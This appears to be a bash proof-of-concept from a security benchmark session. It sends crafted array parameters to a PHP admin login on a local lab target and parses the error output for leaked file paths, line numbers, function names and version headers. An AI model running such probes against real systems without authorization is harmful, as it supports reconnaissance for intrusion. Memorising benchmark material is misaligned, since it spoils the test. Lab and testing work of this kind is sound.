#!/bin/bash
# POC: Demonstrates information disclosure through PHP error messages when submitting array parameters to the admin.php authentication endpoint, revealing file paths, line numbers, and function names
# Target: ./repo
# Created: 2025-11-07T21:48:58.685Z
# Session: benchmark-XBEN-078-24-mhpdbdxp

# Information Disclosure POC - PHP Error Messages in Admin Panel
# This script demonstrates how array parameters trigger PHP warnings
# that reveal sensitive information about the application structure

TARGET_URL="${1:-http://localhost:8080/admin.php}"
OUTPUT_FILE="/tmp/info_disclosure_response.txt"

echo "[*] Information Disclosure POC - Admin Panel PHP Errors"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Submit array parameters to trigger type juggling error
echo "[+] Test 1: Submitting array parameters to trigger type juggling"
echo "[*] Payload: username[\$gt]=&password[\$gt]="
echo ""

curl -s -X POST "$TARGET_URL" \
  -d 'username[$gt]=&password[$gt]=' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  > "$OUTPUT_FILE"

echo "[*] Response received. Checking for information disclosure..."
echo ""

# Check for file path disclosure
if grep -q "/var/www/html/admin.php" "$OUTPUT_FILE"; then
    echo "[!] VULNERABLE: File path disclosure detected"
    grep "/var/www/html/admin.php" "$OUTPUT_FILE" | head -1
    echo ""
fi

# Check for line number disclosure
if grep -q "line [0-9]" "$OUTPUT_FILE"; then
    echo "[!] VULNERABLE: Line number disclosure detected"
    grep -oE "line [0-9]+" "$OUTPUT_FILE" | head -1
    echo ""
fi

# Check for function name disclosure
if grep -q "mysqli_real_escape_string" "$OUTPUT_FILE"; then
    echo "[!] VULNERABLE: Function name disclosure detected (mysqli_real_escape_string)"
    echo ""
fi

# Check for PHP warning/notice
if grep -qiE "(Warning|Notice|Error):" "$OUTPUT_FILE"; then
    echo "[!] VULNERABLE: PHP error message revealed"
    echo ""
fi

# Display full error message
echo "[*] Full error response:"
echo "=========================================="
grep -iE "(Warning|Notice|Error):" "$OUTPUT_FILE" | head -5
echo "=========================================="
echo ""

# Test 2: Check for version information
echo "[+] Test 2: Checking for version information in headers"
HEADERS_FILE="/tmp/info_disclosure_headers.txt"

curl -s -i -X POST "$TARGET_URL" \
  -d 'username[$gt]=&password[$gt]=' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  > "$HEADERS_FILE" 2>&1

if grep -q "X-Powered-By" "$HEADERS_FILE"; then
    echo "[!] VULNERABLE: X-Powered-By header reveals version info"
    grep "X-Powered-By" "$HEADERS_FILE"
    echo ""
fi

# Summary
echo "[*] Vulnerability Summary:"
echo "    - Application reveals file paths in error messages"
echo "    - Application reveals line numbers where code exists"
echo "    - Application reveals function names (mysqli_real_escape_string)"
echo "    - This aids attackers in reconnaissance and crafting exploits"
echo ""
echo "[+] POC Complete"